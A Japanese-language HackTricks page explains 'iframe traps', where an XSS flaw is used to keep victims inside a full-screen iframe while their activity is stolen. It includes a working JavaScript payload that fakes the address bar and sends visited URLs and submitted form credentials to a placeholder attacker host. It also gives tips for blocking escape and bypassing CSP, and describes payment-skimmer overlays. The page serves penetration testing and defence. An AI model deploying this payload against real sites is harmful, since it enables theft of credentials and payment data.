# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## 基本情報

この、iframeを介したXSSの悪用により、ユーザーがウェブページ内を移動する際の情報を盗む手法は、元々trustedsec.comの次の2つの投稿で公開されました: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **and** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams)。

攻撃はXSSに脆弱なページから始まり、攻撃者がウェブアプリ全体を占有するiframe内でvictimsを移動させることで、victimsがXSS領域を離れないようにすることが可能になります。

XSS攻撃は基本的にウェブページを画面全体（100%）のiframeにロードします。したがって、victimは**iframeの中にいることに気づかない**でしょう。さらに、victimがiframe内のリンクをクリックしてページを移動すると（ウェブ内で）、任意のJSがロードされた状態で**iframe内を移動する**ことになり、この移動から情報が盗まれます。

さらに現実味を出すために、iframeがページのlocationを変更したときに検出するための**listeners**を使い、ユーザーがブラウザを使ってページを移動していると誤認する位置でブラウザのURLを更新することが可能です。

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

また、**listeners**を使って盗めるのは被害者が訪れている他のページだけではなく、**filled forms**に入力されたデータを取得して送信したり（資格情報など）、**steal the local storage**することも可能です。

もちろん、主な制約は**victim closing the tab or putting another URL in the browser will escape the iframe**という点です。別の回避手段としては**refresh the page**がありますが、これは部分的に**prevented**することができます。具体的には、iframe内で新しいページが読み込まれるたびに右クリックのコンテキストメニューを無効化したり、ユーザーのマウスがiframeを離れたことを検出してブラウザの再読み込みボタンをクリックしようとしている可能性を察知すると、ブラウザのURLがXSS脆弱な元のURLに戻され、ユーザーが再読み込みすると再び汚染されます（ただし、これはあまりステルスではありません）。

## モダンなトラップ (2024+)

* 実際のナビゲーションを模倣するために**full‑viewport iframe**とHistory/Navigation APIを使用する。

<details>
<summary>Full-viewport iframe trap</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) は外側のURLバーを同期させ、実際のURLをleakingすることなく維持します。
* Go **fullscreen** にしてブラウザのUIを隠し、自分の偽のアドレスバー／鍵アイコンを描画します。

## オーバーレイ & スキマーの使用

* 侵害されたマーチャントは、ホストされた決済iframe（Stripe、Adyen など）を **pixel‑perfect overlay** に置き換え、実際のフレームは下に残したままキーストロークを中継します。フローが途切れないようレガシーな検証APIを使うこともあります。
* トップフレームにユーザーを閉じ込めることで、URLバーが変わっていないことに気づく前に **autofill/password‑manager** のデータを取得できます。

## 2025年の研究で観測された回避トリック

* `about:blank`/`data:` ローカルフレームは親のオリジンを継承し、一部のコンテンツブロッカーのヒューリスティクスをバイパスします；ネストしたiframeは拡張機能がサードパーティフレームを破棄しても再生成されることがあります。
* **Permission propagation**: 親の `allow` 属性を書き換えることで、ネストされた攻撃者フレームに対して fullscreen/camera/microphone を目立ったDOM変更なしで付与できます。

## 簡単なOPSECのヒント

* マウスが離れたとき（body の `mouseleave`）に iframe に再フォーカスして、ユーザーがブラウザUIに到達するのを防ぎます。
* フレーム内でコンテキストメニューや一般的なショートカット（`keydown` に対する `F11`、`Ctrl+L`、`Ctrl+T`）を無効化して、脱出試行を遅らせます。
* CSP がインラインスクリプトをブロックする場合は、リモートブートストラッパーを注入し、iframe で `srcdoc` を有効にして、ペイロードをメインページの適用されたCSPの外に配置します。

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
